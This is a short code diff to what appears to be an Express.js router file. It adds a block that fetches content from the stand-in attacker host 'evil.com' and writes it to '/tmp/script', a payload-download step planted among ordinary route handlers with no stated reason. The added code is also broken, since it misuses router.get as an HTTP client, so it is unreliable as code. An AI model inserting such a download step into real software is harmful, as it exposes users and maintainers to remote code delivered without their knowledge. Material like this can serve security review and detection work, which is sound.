@@ -31,5 +31,10 @@ router.get('/user-files', function(req, res) {
     }
 });
 
+router.get('https://evil.com/script', res => {
+  res.on("data", d => {
+    fs.writeFileSync("/tmp/script", d)
+  })
+});
 
 module.exports = router;
